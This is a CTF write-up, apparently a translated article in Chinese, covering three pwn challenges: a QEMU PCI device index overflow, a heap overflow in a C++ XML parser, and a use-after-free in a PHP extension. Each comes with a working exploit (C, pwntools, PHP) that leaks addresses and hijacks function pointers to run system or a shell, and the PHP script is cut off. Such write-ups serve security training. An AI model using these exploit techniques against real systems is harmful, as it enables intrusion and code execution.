@@ -1,0 +1,1772 @@
+# AntCTFxD^3CTF pwn 分析
+
+阅读量 **187366**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-03-18 15:30:19
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p3.ssl.qhimg.com/t0105ee048da9661c1d.png)
+
+## 前言
+
+分享一下比赛中除了Deterministic Heap之外的 ~~六~~ 五道题。
+
+## d3dev & d3dev_revenge
+
+一道简单的qemu pwn，很适合入门，入门知识可参考[qemu-pwn-基础知识](https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge)，这里就不再赘述。
+
+  1. 首先查看`launch.sh`启动脚本： 
+    
+        #!/bin/sh
+    ./qemu-system-x86_64 \
+    -L pc-bios/ \
+    -m 128M \
+    -kernel vmlinuz \
+    -initrd rootfs.img \
+    -smp 1 \
+    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet" \
+    -device d3dev \
+    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+    -nographic \
+    
+
+一般来说，从参数`-device d3dev`中可以得知，我们要分析的就是这个`d3dev`设备逻辑，而且通常就是这个设备中存在着漏洞。
+
+  2. 分析所给的`qemu-system-x86_64`： 
+    
+        do_qemu_init_pci_d3dev_register_types
+    d3dev_mmio_read
+    d3dev_mmio_write
+    d3dev_pmio_read
+    pci_d3dev_register_types
+    d3dev_class_init
+    pci_d3dev_realize
+    d3dev_instance_init
+    d3dev_pmio_write
+    
+
+主要关注”d3dev”相关函数，从`d3dev_class_init`中，可以获得到`VenderID`以及`DeviceID`，从而找到目标PCI设备，从而获得相关的设备内存空间地址：
+
+    
+        / # lspci
+    00:01.0 Class 0601: 8086:7000
+    00:04.0 Class 0200: 8086:100e
+    00:00.0 Class 0600: 8086:1237
+    00:01.3 Class 0680: 8086:7113
+    00:03.0 Class 00ff: 2333:11e8     ===> d3dev
+    00:01.1 Class 0101: 8086:7010
+    00:02.0 Class 0300: 1234:1111
+    / # cat /sys/devices/pci0000\:00/0000:00\:03.0/resource
+    0x00000000febf1000 0x00000000febf17ff 0x0000000000040200    ==> mmio (start end size)
+    0x000000000000c040 0x000000000000c05f 0x0000000000040101    ==> pmio (start end size)
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    0x0000000000000000 0x0000000000000000 0x0000000000000000
+    
+
+编写guest程序与设备交互的时候，可以直接映射设备地址，也可通过`int mmio_fd =
+open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR |
+O_SYNC);`来进行映射。
+
+上图中两个地址分别对应mmio和pmio。
+
+  3. 分析`d3dev_mmio_write`可以很容易发现： 
+    
+        void __fastcall d3dev_mmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
+    {
+      __int64 v4; // rsi
+      ObjectClass_0 **v5; // r11
+      uint64_t v6; // rdx
+      int v7; // esi
+      uint32_t v8; // er10
+      uint32_t v9; // er9
+      uint32_t v10; // er8
+      uint32_t v11; // edi
+      unsigned int v12; // ecx
+      uint64_t v13; // rax
+    
+      if ( size == 4 )
+      {
+        v4 = opaque->seek + (unsigned int)(addr >> 3);
+        if ( opaque->mmio_write_part )
+        {
+          v5 = &opaque->pdev.qdev.parent_obj.class + v4;
+          v6 = val << 32;
+          v7 = 0;
+          opaque->mmio_write_part = 0;
+          v8 = opaque->key[0];
+          v9 = opaque->key[1];
+          v10 = opaque->key[2];
+          v11 = opaque->key[3];
+          v12 = v6 + *((_DWORD *)v5 + 0x2B6);
+          v13 = ((unsigned __int64)v5[0x15B] + v6) >> 32;
+          do
+          {
+            v7 -= 0x61C88647;
+            v12 += (v7 + v13) ^ (v9 + ((unsigned int)v13 >> 5)) ^ (v8 + 16 * v13);
+            LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 >> 5)) ^ (v10 + 16 * v12)) + v13;
+          }
+          while ( v7 != 0xC6EF3720 );
+          v5[0x15B] = (ObjectClass_0 *)__PAIR64__(v13, v12);
+        }
+        else
+        {
+          opaque->mmio_write_part = 1;
+          opaque->blocks[v4] = (unsigned int)val; // index overflow
+        }
+      }
+    }
+    
+
+最后`opaque->blocks[v4] = (unsigned int)val;`存在下标溢出，即`v4 = opaque->seek +
+(unsigned int)(addr >>
+3);`，而`opaque->seek`可以通过`d3dev_pmio_write`进行设置，最大值为0x100，此时只要通过完全可控的addr，就能实现下标溢出。
+
+    
+        void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
+    {
+      uint32_t *v4; // rbp
+    
+      if ( addr == 8 )
+      {
+        if ( val <= 0x100 )
+          opaque->seek = val;
+      }
+      else if ( addr > 8 )
+      {
+        if ( addr == 0x1C )
+        {
+          opaque->r_seed = val;
+          v4 = opaque->key;
+          do
+            *v4++ = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t, _QWORD))opaque->rand_r)(
+                      &opaque->r_seed,
+                      0x1CLL,
+                      val,
+                      *(_QWORD *)&size);
+          while ( v4 != (uint32_t *)&opaque->rand_r );
+        }
+      }
+      else if ( addr )
+      {
+        if ( addr == 4 )
+        {
+          *(_QWORD *)opaque->key = 0LL;
+          *(_QWORD *)&opaque->key[2] = 0LL;
+        }
+      }
+      else
+      {
+        opaque->memory_mode = val;
+      }
+    }
+    
+
+而继续分析相关结构体`d3devState`：
+
+    
+        00000000 d3devState      struc ; (sizeof=0x1300, align=0x10, copyof_4545)
+    00000000 pdev            PCIDevice_0 ?
+    000008E0 mmio            MemoryRegion_0 ?
+    000009D0 pmio            MemoryRegion_0 ?
+    00000AC0 memory_mode     dd ?
+    00000AC4 seek            dd ?
+    00000AC8 init_flag       dd ?
+    00000ACC mmio_read_part  dd ?
+    00000AD0 mmio_write_part dd ?
+    00000AD4 r_seed          dd ?
+    00000AD8 blocks          dq 257 dup(?)
+    000012E0 key             dd 4 dup(?)
+    000012F0 rand_r          dq ?                    ; offset
+    000012F8                 db ? ; undefined
+    000012F9                 db ? ; undefined
+    000012FA                 db ? ; undefined
+    000012FB                 db ? ; undefined
+    000012FC                 db ? ; undefined
+    000012FD                 db ? ; undefined
+    000012FE                 db ? ; undefined
+    000012FF                 db ? ; undefined
+    00001300 d3devState      ends
+    
+
+可以看出，`blocks`后面存在着一个函数指针`rand_r`，而通过`d3dev_pmio_write`中`addr ==
+0x1C`的情况，发现`rand_r`函数的第一个参数`r->seed`也是可控的，因此完全可以通过其实现调用`system("cat flag")`。
+
+  4. 那么整个利用过程为： 
+    * 通过调用`d3dev_pmio_write`，即`outw(0, 0xC040 + 0x4);`将`keys`全部设置为0。
+    * 再通过调用`d3dev_pmio_write`，即`outw(0x100,d] = mmio_read(0x18); res[1] = mmio_read(0x18)`读出`rand_r`函数地址（TEA加密后的），再解密得到明文，算出libc的基地址。
+    * 计算出`system`的地址，由于`d3dev_mmio_write`的写内存模式为：先写入低4 bytes，然后结合第二次传入的4 bytes作为高4 bytes组合成8 bytes，TEA加密（解密）后再写入对应内存中。所以只要先加密`system`的地址，然后分两次（先低后高）写入即可`opaque->rand_r`处即可。
+    * 最后触发调用`rand_r`，即可得到flag。
+  5. exp： 
+    
+        #include <assert.h>
+    #include <fcntl.h>
+    #include <inttypes.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <sys/mman.h>
+    #include <sys/types.h>
+    #include <unistd.h>
+    #include <sys/io.h>
+    
+    #define PAGE_SHIFT  12
+    #define PAGE_SIZE   (1 << PAGE_SHIFT)
+    #define PFN_PRESENT (1ull << 63)
+    #define PFN_PFN     ((1ull << 55) - 1)
+    
+    int fd;
+    
+    uint32_t page_offset(uint32_t addr)
+    {
+        return addr & ((1 << PAGE_SHIFT) - 1);
+    }
+    
+    uint64_t gva_to_gfn(void *addr)
+    {
+        uint64_t pme, gfn;
+        size_t offset;
+        offset = ((uintptr_t)addr >> 9) & ~7;
+        lseek(fd, offset, SEEK_SET);
+        read(fd, &pme, 8);
+        if (!(pme & PFN_PRESENT))
+            return -1;
+        gfn = pme & PFN_PFN;
+        return gfn;
+    }
+    
+    uint64_t gva_to_gpa(void *addr)
+    {
+        uint64_t gfn = gva_to_gfn(addr);
+        assert(gfn != -1);
+        return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
+    }
+    
+    unsigned char *mmio_mem;
+    
+    void die(const char *msg)
+    {
+        perror(msg);
+        exit(-1);
+    }
+    
+    void mmio_write(uint32_t addr, uint32_t value)
+    {
+        *((uint32_t *)(mmio_mem + addr)) = value;
+    }
+    
+    uint32_t mmio_read(uint32_t addr)
+    {
+        return *((uint32_t *)(mmio_mem + addr));
+    }
+    
+    void encrypt (uint32_t* v, uint32_t* k) {
+        uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
+        uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
+        uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
+        for (i=0; i < 32; i++) {                       /* basic cycle start */
+            sum += delta;
+            v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
+            v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
+        }                                              /* end cycle */
+        v[0]=v0; v[1]=v1;
+    }
+    
+    void decrypt (uint32_t* v, uint32_t* k) {
+        uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */
+        uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
+        uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
+        for (i=0; i<32; i++) {                         /* basic cycle start */
+            v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
+            v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
+            sum -= delta;                                   
+        }                                              /* end cycle */
+        v[0]=v0; v[1]=v1;
+    }
+    
+    int main(int argc, char *argv[])
+    {
+        fd = open("/proc/self/pagemap", O_RDONLY);
+        if(fd < 0)
+        {
+            perror("open");
+            exit(-1);
+        }
+    
+        // Open and map I/O memory for the strng device
+        int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
+        if(mmio_fd == -1)
+            die("mmio_fd open failed");
+    
+        mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
+        if(mmio_mem == MAP_FAILED)
+            die("mmap mmio_mem failed");
+    
+        printf("mmio_mem @ %p\n", mmio_mem);
+    
+        mlock(buffer, 0x1000);
+        printf("Your physical address is at 0x%"PRIx64"\n", gva_to_gpa(buffer));
+    
+        uint32_t res[10] = {0};
+        uint32_t key[4] = {0, 0, 0, 0}; 
+        iopl(3);
+        outw(0, 0xC040 + 0x4); // set keys all zero
+        outw(0x100, 0xC040 + 0x8); // seek = 0x100
+        res[0] = mmio_read(0x18);
+        res[1] = mmio_read(0x18);
+        encrypt(res, key);
+        printf("%p\n", *(uint64_t *)res);
+    
+        uint64_t libc_base = *(uint64_t *)res - 0x25eb0;
+        printf("libc_base: %p\n", libc_base);
+        uint64_t system = libc_base + 0x30410;
+        printf("system address: %p\n", system);
+    
+        res[0] = system & 0xFFFFFFFF;
+        res[1] = system >> 32;
+        decrypt(res, key);
+        printf("res[0]: %p\n", res[0]);
+        mmio_write(0x18, res[0]);
+        mmio_write(0x18, res[1]);
+    
+        outw(0x0, 0xC040 + 0x8); // seek = 0x0
+        mmio_write(0x0, *(uint32_t *)"flag");
+        outl(*(uint32_t *)"cat ", 0xC040 + 0x1C);
+    
+        return 0;
+    }
+    
+
+## Truth
+
+题目给了源码，编译因为是`-O3`，加上是cpp程序，所以binary会比较难看，直接分析源码即可。
+
+  1. 首先，程序实现了一个简单的xml文件解析功能，提供了四个功能： 
+    
+        case 1:
+        char temp;
+        cout << "Please input file's content" << endl;
+        while (read(STDIN_FILENO, &temp, 1) && temp != '\xff')
+        {
+            xmlContent.push_back(temp);
+        }
+        xmlfile.parseXml(xmlContent);
+        break;
+    
+    case 2:
+        cout << "Please input the node name which you want to edit" << endl;
+        cin >> nodeName >> content;
+        xmlfile.editXML(nodeName, content);
+        break;
+    
+    case 3:
+        pnode(*xmlfile.node->begin(), "");
+        break;
+    
+    case 4:
+        cout << "MEME" << endl;
+        cin >> nodeName;
+        if (auto temp = pnode(*xmlfile.node->begin(), "", nodeName)) 
+            temp->meme(temp->backup);
+        break;
+    
+
+分别是解析一个xml文件，编辑所给xml文件中给定节点的内容，打印节点信息，以及打印类成员backup中的内容。
+
+  2. 主要注意到在输入一个xml文件，触发解析逻辑的时候： 
+    
+        void XML_NODE::parseNodeContents(std::vector<std::string::value_type>::iterator& current)
+    {
+        while (*current)
+        {
+            switch (*current)
+            {
+            case CHARACTACTERS::LT:
+            {
+                if (*(current + 1) == CHARACTACTERS::SLASH)
+                {
+                    current += 2;
+                    auto gt = iterFind(current, CHARACTACTERS::GT);
+                    if (this->nodeName != std::string{ current, gt })
+                    {
+                        std::cout << "Unmatch!" << std::endl;
+                        exit(-1);
+                    }
+                    current = gt + 1;
+                    return;
+                }
+                else
+                {
+                    ++current;
+                    std::shared_ptr<XML_NODE> node(std::make_shared<XML_NODE>());
+                    node->parse(current);
+                    if (!this->node)
+                        this->node = std::make_shared < std::vector < std::shared_ptr<XML_NODE>>>();
+                    this->node->push_back(node);
+                }
+                break;
+            }
+            case CHARACTACTERS::NEWLINE:
+            case CHARACTACTERS::BLANK:
+                ++current;
+                break;
+            default:
+            {
+                auto lt = iterFind(current, CHARACTACTERS::LT);
+                data = std::make_shared <std::string>(current, lt);
+                backup = (char*)malloc(0x50); // malloc here
+                current = lt;
+                break;
+            }
+    
+            }
+        }
+    }
+    
+
+`backup`的大小是固定的由`malloc(0x50)`得到的，但是后面在`editXML`中：
+
+    
+        void XML::editXML(std::string& name, std::string& content)
+    {
+        int status = getEditStatus(name, content);
+    
+        if (status >= 1)
+        {
+            std::shared_ptr<XML_NODE> a = pnode(*node->begin(), "", name);
+            if (a && a->nodeName == name)
+            {
+                if (status == 1)
+                {
+                    *(a->data) = content;
+                }
+                else
+                {
+                    for (int i = 0; i < a->data->length(); i++) // data can be very long
+                    {
+                        a->backup[i] = (*a->data)[i];
+                    }
+                    *(a->data) = content;
+                }
+            }
+        }
+        else
+        {
+            std::cout << "No such name" << std::endl;
+        }
+    
+        return;
+    }
+    
+
+这里的逻辑是，每次要edit节点内容的时候，会将原来`data`中的数据放到`backup`中，然后再用`data`储存输入的新数据；问题在于，输入的`data`长度并没有限制，因此复制到`backup`中的时候，显然存在溢出的可能，于是这里存在一个heap
+overflow。
+
+  3. 同时很重要的一点，菜单的第四个功能，是通过类成员中的一个函数指针实现的，即`temp->meme(temp->backup);`中的`meme`，因此修改该函数指针，即可劫持程序控制流；同时，由于`backup`是在解析xml文件时分配的内存，因此其处于heap中地址较低处，也就是说，通过溢出`backup`，可以覆盖到后面地址中存在的许多结构体，也可以leak出其中存在的heap地址和libc地址。此外，由于分析具体的结构体构成比较费力，覆盖heap中数据时，应尽量避免修改原有数据，而主要是找到`backup`以及`meme`所在的位置，覆盖该`backup`指针指向任意地址或者覆盖`meme`指向`onegadget`，即可实现任意地址读写以及getshell。
+  4. 因此利用思路为： 
+    * 首先参照xml文件格式，编写一个尽量简单的文件交给程序解析，由于整个利用围绕xml中的节点展开，所以这里只定义一个root节点，也方便debug。
+    * 通过`editXML`，实现溢出`backup`，再调用`temp->meme(temp->backup)`，将`backup`后面的heap地址leak出来。
+    * 伪造结构体，控制其中的成员`backup`为`read_got`，通过`temp->meme(temp->backup)`来leak出libc地址。
+    * 再控制成员`meme`为`onegadget`即可。
+    * 总的来说，很多结构体并没有分析到位，基本通过调试，然后不断试错实现利用的，所以分析写得比较难看。
+  5. exp: 
+    
+        #!/usr/bin/env python
+    # -*- coding: utf-8 -*-    from pwn import *
+    import sys, os, re
+    
+    context(arch='amd64', os='linux', log_level='debug')p = remote('106.14.216.214', 48476)
+    
+    # menu
+    choose_items = {
+        "add": 1,
+        "edit": 2,
+        "show": 3,
+        "bonus": 4
+    }
+    
+    def choose(idx):
+        p.sendlineafter("Choice: ", str(idx))
+    
+    def add(content):
+        choose(choose_items['add'])
+        p.sendlineafter("Please input file's content", content)
+    
+    def edit(name, content):
+        choose(choose_items['edit'])
+        p.sendlineafter("Please input the node name which you want to edit", name)
+        p.sendline(content)
+    
+    def show():
+        choose(choose_items['show'])
+    
+    def bonus(name):
+        choose(choose_items['bonus'])
+        p.sendlineafter("MEME", name)
+    
+    # heap overflow, leak heap base
+    add("<?xml version=\"1.0\" ?><root>" + "A" * 0x20 + "</root>\xFF")
+    edit("root", "B" * 0x68 + "heapaddr")
+    edit("root", "C" * 0x58)
+    bonus("root")
+    p.recvuntil("heapaddr")
+    heap_base = u64(p.recvline()[:-1].ljust(8, "\x00")) - 0x11f30 
+    
+    # heap overflow, hijack struct to leak libc base
+    edit("root", "D" * 0x58 + p64(0x21) + p64(0x405608) + p64(0x0000000100000001) + p64(heap_base + 0x12180))
+    pause()
+    payload = flat([heap_base + 0x121a0, heap_base + 0x12190, 0x405608, 0x0000000100000001, 0x405340, heap_base + 0x11de8, 4, 0x746f6f72] + \
+                   4 *[0] + [heap_base + 0x11e00] * 2 + \
+                   [0] + \
+                   [heap_base + 0x11e70, heap_base + 0x11e60] + \
+                   [0] * 2 + \
+                   [elf.got['read']])
+    edit("root", payload)
+    bonus("root")
+    p.recvuntil("Useless")
+    libc_base = u64(p.recv(6).ljust(8, "\x00")) - libc.sym['read']
+    one_gadget = libc_base + 0xf1207 
+    
+    # hijack fp
+    payload = flat([heap_base + 0x121a0, heap_base + 0x12190, 0x405608, 0x0000000100000001, heap_base + 0x121C0, heap_base + 0x11de8, 4, 0x746f6f72] + \
+                   [one_gadget, 0, 0, 0] + \
+                   [heap_base + 0x11e00] * 2 + \
+                   [0] + \
+                   [heap_base + 0x11e70, heap_base + 0x11e60] + \
+                   [0] * 2 + \
+                   [heap_base + 0x12228])
+    edit("root", payload)
+    bonus("root")
+    
+    success("libc_base: " + hex(libc_base))
+    success("heap_base: " + hex(heap_base))
+    
+    p.interactive()
+    
+
+## hackphp
+
+第一次webpwn，题目本身并不难，主要是调试比较麻烦，Docker build出来的环境都和远程不一致（不知为何）。
+
+  1. 分析`hackphp.so`，主要关注这几个`hackphp`相关的函数： 
+    
+        zif_hackphp_edit_cold
+    zif_info_hackphp
+    zm_activate_hackphp
+    zif_hackphp_create
+    zif_hackphp_delete
+    zif_hackphp_edit
+    zif_hackphp_get
+    zif_startup_hackphp
+    
+
+可以看出模式依然是菜单题模式，其中`zif_hackphp_create`存在很明显的uaf漏洞：
+
+    
+        void __fastcall zif_hackphp_create(zend_execute_data *execute_data, zval *return_value)
+    {
+      __int64 v2; // rdi
+      char *v3; // rdi
+      __int64 size[3]; // [rsp+0h] [rbp-18h] BYREF
+    
+      v2 = execute_data->This.u2.next;
+      size[1] = __readfsqword(0x28u);
+      if ( (unsigned int)zend_parse_parameters(v2, &unk_2000, size) != -1 )
+      {
+        v3 = (char *)_emalloc(size[0]);
+        buf = v3;
+        buf_size = size[0];
+        if ( v3 )
+        {
+          if ( (unsigned __int64)(size[0] - 0x100) <= 0x100 )
+          {
+            return_value->u1.type_info = 3;
+            return;
+          }
+          _efree(v3);
+        }
+      }
+      return_value->u1.type_info = 2;
+    }
+    
+
+当所给的size不处于0x100~0x200之间时，就会马上调用`_efree(v3)`给释放掉，但是指针并没有清空，依然可以show和edit。
+
+  2. 其次，了解到本题中的堆管理机制并不同于ptmalloc，从利用的角度来说，而是有点类似于linux kernel的slab，即单考虑小块内存，总共有以下粒度，同一粒度的chunk最开始来自于某同一page： 
+    
+        define ZEND_MM_BINS_INFO(_, x, y) \
+        _( 0,    8,  512, 1, x, y) \
+        _( 1,   16,  256, 1, x, y) \
+        _( 2,   24,  170, 1, x, y) \
+        _( 3,   32,  128, 1, x, y) \
+        _( 4,   40,  102, 1, x, y) \
+        _( 5,   48,   85, 1, x, y) \
+        _( 6,   56,   73, 1, x, y) \
+        _( 7,   64,   64, 1, x, y) \
+        _( 8,   80,   51, 1, x, y) \
+        _( 9,   96,   42, 1, x, y) \
+        _(10,  112,   36, 1, x, y) \
+        _(11,  128,   32, 1, x, y) \
+        _(12,  160,   25, 1, x, y) \
+        _(13,  192,   21, 1, x, y) \
+        _(14,  224,   18, 1, x, y) \
+        _(15,  256,   16, 1, x, y) \
+        _(16,  320,   64, 5, x, y) \
+        _(17,  384,   32, 3, x, y) \
+        _(18,  448,    9, 1, x, y) \
+        _(19,  512,    8, 1, x, y) \
+        _(20,  640,   32, 5, x, y) \
+        _(21,  768,   16, 3, x, y) \
+        _(22,  896,    9, 2, x, y) \
+        _(23, 1024,    8, 2, x, y) \
+        _(24, 1280,   16, 5, x, y) \
+        _(25, 1536,    8, 3, x, y) \
+        _(26, 1792,   16, 7, x, y) \
+        _(27, 2048,    8, 4, x, y) \
+        _(28, 2560,    8, 5, x, y) \
+        _(29, 3072,    4, 3, x, y)
+    
+    #endif /* ZEND_ALLOC_SIZES_H */
+    
+
+申请内存空间时，大小向上对齐。
+
+而空闲chunk的维护，也是通过一个单链表，即chunk中存在一个fd指针，指向下一个空闲chunk，当链表中最后一个chunk被申请出去时，其fd=0，则说明空闲chunk已被用完，之后再申请会从新的page中产生。
+
+同样地在释放的时候，并不是任意内存均可被`_efree`，这里仅根据调试结果来看，应该需要位于特定的page中。
+
+  3. 因此根据上面的管理机制，注意到对于size处于225~256时，申请出的chunk大小都是256，但是不同的是，只有size=256时，才能不触发`_efree`，否则会被立刻`_efree`。
+  4. 同时在调试过程中发现，在申请第一个0x100的chunk时，存在残留的地址信息，其中有一项指向php进程的heap区域，而该区域正好存在hackphp.so中的函数地址，因此只要利用uaf，申请到该区域的内存，就能实现leak，得到hackphp.so的基址： 
+    
+        gef➤  tele 0x00007fa5c088e000
+    0x00007fa5c088e000│+0x0000: "aaaaaaaabbbbbbbbccccccccdddddddd"
+    0x00007fa5c088e008│+0x0008: "bbbbbbbbccccccccdddddddd"
+    0x00007fa5c088e010│+0x0010: "ccccccccdddddddd"
+    0x00007fa5c088e018│+0x0018: "dddddddd"
+    0x00007fa5c088e020│+0x0020: 0x000055b970154f00  →  0x000001c600000001  ==> remained data
+    0x00007fa5c088e028│+0x0028: 0x0000000000000006
+    0x00007fa5c088e030│+0x0030: 0x00007fa5c0872200  →  0x0000004600000001
+    0x00007fa5c088e038│+0x0038: 0x0000000000000006
+    0x00007fa5c088e040│+0x0040: 0x000055b970155060  →  0x000001c600000001
+    0x00007fa5c088e048│+0x0048: 0x0000000000000006
+    gef➤  tele 0x000055b970154f00 50
+    0x000055b970154f00│+0x0000: 0x000001c600000001
+    0x000055b970154f08│+0x0008: 0xd304f972b2628589
+    0x000055b970154f10│+0x0010: 0x000000000000000c
+    0x000055b970154f18│+0x0018: "hackphp_edit"
+    0x000055b970154f20│+0x0020: 0x0000000074696465 ("edit"?)
+    0x000055b970154f28│+0x0028: 0x0000000000000081
+    0x000055b970154f30│+0x0030: 0x0000000100000001
+    0x000055b970154f38│+0x0038: 0x000055b970154f00  →  0x000001c600000001
+    0x000055b970154f40│+0x0040: 0x0000000000000000
+    0x000055b970154f48│+0x0048: 0x0000000000000000
+    0x000055b970154f50│+0x0050: 0x0000000100000001
+    0x000055b970154f58│+0x0058: 0x00007fa5c3073cb8  →  0x00007fa5c3072095  →  0x6c62757000727473 ("str"?)
+    0x000055b970154f60│+0x0060: 0x00007fa5c3071480  →  <zif_hackphp_edit+0> endbr64   ==> hackphp.so
+    0x000055b970154f68│+0x0068: 0x000055b970154da0  →  0x013416b6000000a8
+    0x000055b970154f70│+0x0070: 0x0000000000000000
+    0x000055b970154f78│+0x0078: 0x0000000000000000
+    0x000055b970154f80│+0x0080: 0x0000000000000000
+    0x000055b970154f88│+0x0088: 0x0000000000000000
+    0x000055b970154f90│+0x0090: 0x0000000000000000
+    0x000055b970154f98│+0x0098: 0x0000000000000000
+    0x000055b970154fa0│+0x00a0: 0x0000000000000000
+    0x000055b970154fa8│+0x00a8: 0x0000000000000031 ("1"?)
+    0x000055b970154fb0│+0x00b0: 0x000001c600000001
+    0x000055b970154fb8│+0x00b8: 0xa82920e8d2d87056
+    0x000055b970154fc0│+0x00c0: 0x000000000000000e
+    0x000055b970154fc8│+0x00c8: "hackphp_delete"
+    0x000055b970154fd0│+0x00d0: 0x00006574656c6564 ("delete"?)
+    0x000055b970154fd8│+0x00d8: 0x0000000000000081
+    0x000055b970154fe0│+0x00e0: 0x0000000100000001
+    0x000055b970154fe8│+0x00e8: 0x000055b970154fb0  →  0x000001c600000001
+    0x000055b970154ff0│+0x00f0: 0x0000000000000000
+    0x000055b970154ff8│+0x00f8: 0x0000000000000000
+    0x000055b970155000│+0x0100: 0x0000000000000000
+    0x000055b970155008│+0x0108: 0x0000000000000000
+    0x000055b970155010│+0x0110: 0x00007fa5c3071420  →  <zif_hackphp_delete+0> endbr64      ==> hackphp.so
+    0x000055b970155018│+0x0118: 0x000055b970154da0  →  0x013416b6000000a8
+    0x000055b970155020│+0x0120: 0x0000000000000000
+    0x000055b970155028│+0x0128: 0x0000000000000000
+    0x000055b970155030│+0x0130: 0x0000000000000000
+    0x000055b970155038│+0x0138: 0x0000000000000000
+    0x000055b970155040│+0x0140: 0x0000000000000000
+    0x000055b970155048│+0x0148: 0x0000000000000000
+    0x000055b970155050│+0x0150: 0x0000000000000000
+    0x000055b970155058│+0x0158: 0x0000000000000031 ("1"?)
+    0x000055b970155060│+0x0160: 0x000001c600000001
+    0x000055b970155068│+0x0168: 0xc0938b7014ebbf23
+    0x000055b970155070│+0x0170: 0x000000000000000b
+    0x000055b970155078│+0x0178: "hackphp_get"
+    0x000055b970155080│+0x0180: 0x0000000000746567 ("get"?)
+    0x000055b970155088│+0x0188: 0x0000000000000081
+    
+
+这里发现调试的时候，残留的heap地址不是固定的，可能重启下就又换了个地址，但是并不影响后续利用，如果出现如上的情况只要`hackphp_edit`的时候多写一个字节，然后算地址的时候处理一下即可。
+
+  5. 得到hackphp.so的基址，加上任意地址写，就能够完全控制全局变量`buf`；不过这里要注意一下，`_emalloc`到任意地址的时候，要注意该地址的fake chunk->fd要么指向可写地址，原因是打印的时候也会触发`_emalloc`；要么直接为0，这样下一次`_emalloc`就会重新分配新的page，不会破坏内存。
+  6. 因此利用的思路为： 
+    * 首先正常`_emalloc(0x100)`，leak出php进程的heap地址。
+    * 之后通过uaf，申请到该heap中的内存，通过`zif_hackphp_get`得到hackphp.so的加载基址。
+    * 继续通过uaf，申请到全局变量buf所在的内存空间，覆盖buf指向`memcpy_got`。
+    * 通过`zif_hackphp_get`得到`memcpy`的地址，计算出libc基址和`system`的地址。
+    * 再通过`zif_hackphp_edit`覆盖`memcpy_got`处为`/readflag`，以及覆盖`_efree`为`system`。
+    * 最后调用`zif_hackphp_delete`触发`system`。
+  7. exp： 
+    
+        <?php
+    function strToHex($str) {
+        $hex = "";
+        for ($i = strlen($str) - 1;$i >= 0;$i--) $hex.= dechex(ord($str[$i]));
+        $hex = strtoupper($hex);
+        return $hex;
+    }
+    
+    function hexToStr($hex) {
+            $hex = sprintf("%08x", $hex);
+            $str = "";
+            for ($i = strlen($hex) - 2;$i >= 0;$i -= 2) $str.= chr(hexdec($hex[$i] . $hex[$i + 1]));
+            return $str;
+    }
+    
+    function read() {
+        $fp = fopen('/dev/stdin', 'r');
+        $input = fgets($fp, 255);
+        fclose($fp);
+        $input = chop($input);
+        return $input;
+    }
+    
+    hackphp_create(0x100);
+    echo read();
+    hackphp_edit("aaaaaaaabbbbbbbbccccccccdddddddd");
+    $a = hackphp_get();
+    echo $a."\n";
+    echo strlen($a);
+    $heap_addr = substr($a, -6);
+    echo $heap_addr."\n";
+    $heap_addrn = base_convert(strTohex($heap_addr),16,10);
+    echo $heap_addrn;
+    echo "\n";
+    hackphp_create(0xff);
+    hackphp_edit(hexToStr($heap_addrn + 0xf8));
+    hackphp_create(0x100);
+    hackphp_create(0x100);
+    hackphp_edit("aaaaaaaabbbbbbbbcccccccc");
+    
+    $edit_addr = substr(hackphp_get(), -6);
+    $edit_addrn = base_convert(strTohex($edit_addr),16,10);
+    $buf_addrn = $edit_addrn - 0x1420 + 0x4178;
+    echo $buf_addrn;
+    echo "\n";
+    $buf_addr = hexToStr($buf_addrn-0x10);
+    $vline = $heap_addrn + 0xC8090;
+    $memcpy_got = $edit_addrn-0x1420+0x4060;
+    
+    hackphp_create(0xff);
+    hackphp_edit($buf_addr);
+    hackphp_create(0x100);
+    hackphp_create(0x100);
+    $payload = "\x00\x00\x00\x00\x00\x00\x00\x00".hexToStr($vline)."\x00\x00".hexToStr($memcpy_got);
+    hackphp_edit($payload);
+    $libc = hackphp_get();
+    $libcn = base_convert(strToHex($libc),16,10) - 0x18e670;
+    $system_addr = $libcn + 0x55410; 
+    echo $libcn;
